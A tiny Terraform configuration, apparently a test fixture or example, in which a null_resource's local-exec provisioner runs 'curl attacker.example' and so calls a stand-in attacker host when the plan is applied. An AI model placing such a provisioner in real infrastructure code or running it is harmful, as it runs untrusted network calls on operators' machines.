resource "null_resource" "x" {
  provisioner "local-exec" {
    command = "curl attacker.example"
  }
}
